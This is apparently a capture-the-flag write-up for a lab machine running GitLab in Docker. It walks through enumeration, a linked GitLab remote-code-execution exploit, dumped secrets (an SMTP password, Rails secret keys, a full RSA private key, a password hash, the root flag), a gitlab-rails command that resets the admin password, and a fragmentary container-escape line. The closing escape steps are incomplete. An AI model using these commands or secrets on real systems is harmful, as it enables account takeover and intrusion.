# Ready

Machine IP: 10.10.10.220

## Initial enumeration

`nmap -sC -sV 10.10.10.220`

```s
Host is up (0.22s latency).
Not shown: 889 closed ports, 109 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**FUZZing**: `wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404,302 http://10.10.10.220:5080/FUZZ`

**robots.txt**: exists on the server.

- In `http://10.10.10.220:5080/autocomplete/users`, we find a list of users. All of them point to the IP `172.19.0.2` with one subdirectory for each user. Trying to open it takes nowhere, however, see that `path` are given with each user.

```s
id: 1
name: "Administrator"
username: "root"
state: "active"
avatar_url: "..."
web_url: "..."
status_tooltip_html: null
path: "/root"
```
Thus, this directory can be accessed on `http://10.10.10.220:5080/root`. But for all users, this shows the Git history. Most users don't have things, except `dude` (`http://10.10.10.220:5080/dude/` or from `http://10.10.10.220:5080/public`). `dude` has Drupal things on their commit, which leads to the conclusion that somewhere a CMS comes into the picture.

- Drupal version: 7.56 (from `CHANGELOG.txt`) dated 2017-06-21. [This](https://www.exploit-db.com/exploits/46459) doesn't help though. To compromise the web server using the current settings, there has to be a way of executing arbitrary code on the server. Anyone can fork the Drupal repo.

- Searching for GitLab vulnerabilities takes us [here](https://github.com/dotPY-hax/gitlab_RCE). This exploit works exactly. And explanation can be found [here](https://www.youtube.com/watch?v=LrLJuyAdoAg).

The exploit works and provides user flag in `/home/dude/user.txt`.

## Privilege escalation

Interesting things while running privilege escalation enumeration:

- `/var/opt/gitlab/gitlab-rails/etc/secrets.yml`

- Uncommon password files:

```s
passwd file: /etc/cron.daily/passwd
passwd file: /etc/pam.d/passwd
passwd file: /usr/bin/passwd
passwd file: /usr/share/lintian/overrides/passwd
```
- Since `gitlab-rails` was reported, all users registered with GitLab can be dumped and all passwords can be found. I see my dummy user too, I know its password (plaintext) and its encrypted version. A password cracking attack on admin account (?)

- An interesting thing noted:

```s
If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner 'user = User.find_by(email: "youruser@example.com"); user.admin = TRUE; user.save!'
Alternatively, you could change the password of any user by running: gitlab-rails runner 'user = User.find_by(email: "admin@example.com"); user.password = "pass_peass_pass"; user.password_confirmation = "pass_peass_pass"; user.save!'
```

- `smtp password`

```s
/opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

- Another stuff found:

```s
/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml
  repositories:
    # Paths where repositories can be stored. Give the canonicalized absolute pathname.
    # NOTE: REPOS PATHS MUST NOT CONTAIN ANY SYMLINK!!!
    storages: {"default":{"path":"/var/opt/gitlab/git-data/repositories","gitaly_address":"unix:/var/opt/gitlab/gitaly/gitaly.socket"}}

--
  repositories:
    storages:
      default: { "path": "tmp/tests/repositories/" }
  gitlab_shell:
    path: tmp/tests/gitlab-shell/
```

- RSA private key found in `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`

```s
---
production:
  db_key_base: eaa32eb7018961f9b101a330b8a905b771973ece8667634e289a0383c2ecff650bb4e7b1a6034c066af2f37ea3ee103227655c33bc17c123c99f421ee0776429
  secret_key_base: b7c70c02d37e37b14572f5387919b00206d2916098e3c54147f9c762d6bef2788a82643d0c32ab1cdb315753d6a4e59271cddf9b41f37c814dd7d256b7a2f353
  otp_key_base: b30e7b1e7e65c31d70385c47bc5bf48cbe774e39492280df7428ce6f66bc53ec494d2fbcbf9b49ec204b3ba741261b43cdaf7a191932f13df1f5bd6018458e56
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    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
    -----END RSA PRIVATE KEY-----
```


- Another file `/var/opt/gitlab/gitlab-rails/etc/gitlab.yml`

```s
/var/opt/gitlab/gitlab-rails/etc/gitlab.yml
  repositories:
    # Paths where repositories can be stored. Give the canonicalized absolute pathname.
    # NOTE: REPOS PATHS MUST NOT CONTAIN ANY SYMLINK!!!
    storages: {"default":{"path":"/var/opt/gitlab/git-data/repositories","gitaly_address":"unix:/var/opt/gitlab/gitaly/gitaly.socket"}}

--
  repositories:
    storages:
      default: { "path": "tmp/tests/repositories/" }
  gitlab_shell:
    path: tmp/tests/gitlab-shell/
```

- Interesting things not normally found in `/root`:

```s
/root_pass
/.dockerenv
/assets
/RELEASE
```
All in all, the `/opt/gitlab` and `/opt/backup` directories should be very interesting.

- A certain file `root_pass` stays in `/` and has `YG65407Bjqvv9A0a8Tm_7w` (which is not the root flag).

- `/etc/cron.daily/passwd`:

```
#!/bin/sh

cd /var/backups || exit 0

for FILE in passwd group shadow gshadow; do
        test -f /etc/$FILE              || continue
        cmp -s $FILE.bak /etc/$FILE     && continue
        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
done
```
- Inside `/opt/backup/gitlab-secrets.json`, several secret tokens can be found.

- The id `1` user (Administrator) has the following readable config:

```s
"id"=>1,
 "email"=>"admin@example.com",
 "encrypted_password"=>
  "$2a$10$.Kc4bwq3BqLCEzAGJVIJFeK4emNnucvAqk1vCv4Yp45yy2nmrFa.2",
 "reset_password_token"=>nil,
 "reset_password_sent_at"=>nil,
...
...
"password_expires_at"=>nil,
...
...
"notification_email"=>"admin@example.com",
"hide_no_password"=>false,
"password_automatically_set"=>false,
```

## Foothold

A simple command changes the Gitlab root password:
```
gitlab-rails runner 'user = User.find_by(email: "admin@example.com"); user.password = "pass_peass_pass"; user.password_confirmation = "pass_peass_pass"; user.save!'
```
and you can log in as Gitlab root to the web instance.

## Privilege escalation

The thing is inside a docker container so we need to break out of it. 

- First thing is to use the password 'wW59U!ZKMbG9+*#h' to log into as 'root'. This can not be done by the initial terminal so upgrade it to a `pty` using python.

- Test if the container is privileged by `ip link add dummy0 type dummy`

echo "cat /root/root.txt > $host_path/output" >> /cmd

Root flag: `b7f98681505cd39066f67147b103c2b3`
